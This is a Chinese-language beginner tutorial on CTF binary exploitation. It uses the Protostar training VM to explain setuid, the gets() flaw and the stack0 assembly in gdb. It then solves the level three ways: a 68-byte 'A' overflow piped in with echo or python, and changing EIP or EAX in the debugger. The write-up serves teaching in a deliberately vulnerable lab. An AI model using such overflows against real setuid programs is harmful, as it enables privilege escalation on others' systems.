![在这里插入图片描述](https://img-blog.csdnimg.cn/92fdd4e460fe4a5f8ad8b6029071a4e5.png)

# 简介
pwn是ctf比赛的方向之一，也是门槛最高的，学pwn前需要很多知识，这里建议先去在某宝上买一本汇编语言第四版，看完之后学一下python和c语言，python推荐看油管FreeCodeCamp的教程，c语言也是

pwn题目大部分是破解在远程服务器上运行的二进制文件，利用二进制文件中的漏洞来获得对系统的访问权限

这是一个入门pwn很好的靶场，这个靶场包括了：
```
网络编程
处理套接字
栈溢出
格式化字符串
堆溢出
写入shellcode
```
下载地址：
```
https://exploit.education/downloads/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ee834809527b4c2db5007782b40253e0.png)
# 实验环境部署
```
Protostar靶机下载地址：https://exploit.education/protostar/
windoows的ssh连接软件：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
下载完Protostar的镜像文件后，将其安装到vmware上，然后打开
```
账号为user，密码user
如何切换到root权限：进入user用户然后 su root 密码为godmod
```
ssh远程连接
![在这里插入图片描述](https://img-blog.csdnimg.cn/db0b363073f04bb39c4252c0c5de92bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_17,color_FFFFFF,t_70,g_se,x_16)
输入IP后点击打开，输入账号密码，然后输入/bin/bash，更换为可以补全字符串的shell
![在这里插入图片描述](https://img-blog.csdnimg.cn/99e6accc005d4c39bc256b6b3b29c1c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)

在网站的Protostar靶机的介绍处，我们要破解的题目存放在这个目录下
```
/opt/protostar/bin
```
我们进入这个目录，详细查看文件
```
ls -al
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/77f0df2d68f94218b3701f17db931679.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
发现文件都是红色的，我们详细的查看文件
```
flie stack0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c096be93aacb4799a6fdbe890cc31608.png)
这是一个32位的setuid程序
# setuid
什么是setuid？
```
setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配
```
这么说起来有点绕，我们来举一个例子
```
一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了
```
演示
我们用user用户运行一个vim
然后新开一个窗口查看后台进程
```
ps -aux
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/bbc3e82f1a2948209a4a1d37cdbc6ae5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下靶机上的setuid文件看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/30c53f076fde40398592a2264a8f5a9f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行
我们查看文件的权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f59f934076248e79dbcde8ff371e9e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
r代表读，w代表写，x代表执行，那s是什么呢
```
s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的
```
当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的
我们的目标就是，破解这些文件然后拿到root权限
# STACK ZERO程序源代码分析
![在这里插入图片描述](https://img-blog.csdnimg.cn/528a83f5bf8a40f994f0ad1a26562b83.png)


我们破解一个简单的题，通过分析汇编语言，以及相关的知识，来带大家进一步了解程序是如何运行的以及如何破解的
```
题目的源代码：https://exploit.education/protostar/stack-zero/
```
题目详情：这个级别介绍了内存可以在其分配区域之外访问的概念，堆栈变量的布局方式，以及在分配的内存之外进行修改可以修改程序执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/51914e879a634eb2a12862004b435731.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
分析源代码，这是由c语言写成的程序，
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;          //定义一个变量
  char buffer[64];           //给buffer变量定义数组，c语言中一个字符数就是一个字符串

  modified = 0;            //modified变量=0
  gets(buffer);             //获取我们的输入，赋予到buffer变量里

  if(modified != 0) {               //如果modified不等于0
      printf("you have changed the 'modified' variable\n");                //打印'成功改变modified变量'字符串
  } else {                        //否则
      printf("Try again?\n");                   //打印'再试一次'
  }
}
```
很明显，我们要使if语句成功判断，打印成功改变变量的字符串，关于如何破解程序，获取root权限，我会在下一篇文章中介绍
# gets函数漏洞分析
在gets函数的官方文档里，有这么一句话
![在这里插入图片描述](https://img-blog.csdnimg.cn/ff7e8adc6a15426594396f8dd3f1792e.png)
永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。
# 汇编分析
我们使用gdb打开程序进行进一步的分析
```
gdb /opt/protostar/bin/stack0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d6f32c991813464d911c0ee7186fdb64.png)
然后我们查看程序的汇编代码，来了解程序的堆栈是如何工作的
```
set disassembly-flavor intel 参数让汇报代码美观一点
disassemble main  显示所有的汇编程序指令
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d147f2cf1b6147e6b2137ca37457d6a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
```
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```
```
0x080483f4 <main+0>:    push   ebp
```
第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址，在因特尔的指令参考官方资料中，可以看到，mov esp、ebp和pop ebp是函数的开始和结束
https://www.intel.de/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf
![在这里插入图片描述](https://img-blog.csdnimg.cn/b22519516335499493c5d0213bf155af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
在这个程序中，最初操作是将ebp推入栈中，然后把esp的值放入ebp中，而当函数结束时执行了leave操作
```
0x08048433 <main+63>:   leave
leave:
mov esp,ebp
pop ebp
```
可以看到，程序开头和结尾的操作都是对称的
之后执行了如下操作
```
0x080483f7 <main+3>:    and    esp,0xfffffff0
```
AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址

```
0x080483fa <main+6>:    sub    esp,0x60
```
然后esp减去十六进制的60
```
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
```
在内存移动的位置为0，在堆栈上的偏移为0x5c
段地址+偏移地址=物理地址
举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址
这里推荐大家看一下《汇编语言》这本书，在这本书里有很多关于计算机底层的相关知识
```
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
```
lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈
然后DWORD PTR要取eax的地址到esp中
调用gets函数
```
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
```
然后对比之前设置的值，0，用test来检查
```
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
```
这些就是if循环的操作了
# 实战演示
## 方法一：溢出
```
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```
我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。
```
断点意思就是让程序执行到此“停住”，不再往下执行
```
```
b *0x0804840c
```
然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里
```
b *0x08048411
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/65821984a8644803b1da2671a01c7c3a.png)
然后设置
```
define hook-stop
```
这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令
```
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/76672676c8b64ab2bc5a6526a431991c.png)
然后我们输入run运行程序到第一个断点
```
r
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b0d907a84be94f3eaddd56f2ea988395.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
现在我们马上就要执行gets函数了，输入n执行gets函数
```
n    //next
```
我们随意输入一些内容，按下回车键
![在这里插入图片描述](https://img-blog.csdnimg.cn/a8fba895f4a44ae6b10454f56ba74896.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/423cd4dc329c4f9e8503e6c7b0c195e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
可以看到，0x41是A的ascii码，我们距离0x0000000还有一段距离
```
x/wx $esp+0x5c            //查看esp地址+0x5c偏移地址的内容
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4c9fec6769df4db999251a394af61ee3.png)
算了一下，我们需要68个字符才能覆盖
输入q退出gdb
然后使用echo或者python对程序进行输入
```
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | /opt/protostar/bin/stack0
```
```
python -c 'print "A"*(4+16*3+14)' | /opt/protostar/bin/stack0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/71be3bb21b714ee586dfee3430e4c3b0.png)
可以看到，我们已经成功打印出了正确的字符
## 方式二：更改eip寄存器的值
寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在64位程序里叫做RIP，他是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行
重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点

~~~
 b *main
~~~
运行程序到断点处
~~~
r
~~~

查看所有寄存器的值
~~~
info registers
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/c49fb9f3e03e4aff92fb88eec953e19e.png)

我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd
查看程序汇编代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/22cc9c8be6994097b4b654a57a276117.png)
如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the 'modified' variable也就是破解成功了
现在我们修改eip寄存器的值
~~~
set $eip=0x8048419
~~~
修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址
![在这里插入图片描述](https://img-blog.csdnimg.cn/89a24c46dfb84224bd2db0ff9eb4dc1a.png)

~~~
n //执行下一个地址
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/7c819193fef64c5abffb0e9b0eefa3e3.png)

破解成功

## 方式三：修改eax寄存器的值
![在这里插入图片描述](https://img-blog.csdnimg.cn/5bf16ca371cc41b2af38c2080d99939c.png)

最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the 'modified' variable
![在这里插入图片描述](https://img-blog.csdnimg.cn/c1c65aba37cb49238c1d9e268b3c9250.png)


在对比的地方下一个断点

```
b *0x08048415
```
运行程序
```
r
```
查看所有寄存器里的值
![在这里插入图片描述](https://img-blog.csdnimg.cn/e43aa17f55bd4e6294b311b1259586eb.png)
修改eax寄存器里的值
~~~
set $eax = 1
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f7ef1106dc547d7b069ca807a90cae8.png)

然后继续运行程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/73d3a8f5e39a46c68b763c0b7f324cb1.png)

破解成功
